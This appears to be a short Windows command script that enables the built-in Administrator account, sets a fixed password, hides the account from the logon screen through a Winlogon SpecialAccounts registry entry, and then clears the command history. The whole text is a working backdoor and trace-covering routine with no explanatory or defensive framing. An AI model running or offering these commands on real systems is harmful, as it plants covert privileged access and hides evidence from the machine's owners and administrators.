net user Administrator /active:yes
net user Administrator TvruiFvi123#@!
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v Administrator
Clear-History
